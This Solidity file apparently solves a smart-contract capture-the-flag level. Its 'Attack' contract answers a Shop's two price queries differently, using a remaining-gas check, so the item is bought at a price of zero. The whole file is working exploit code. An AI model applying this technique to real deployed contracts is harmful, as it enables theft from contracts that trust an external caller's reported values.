// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Buyer.sol";
import "./Shop.sol";
import "hardhat/console.sol";

contract Attack is Buyer {
    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function price() external view override returns (uint256) {
        if (gasleft() > 60000) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack() external {
        shop.buy();
    }
}
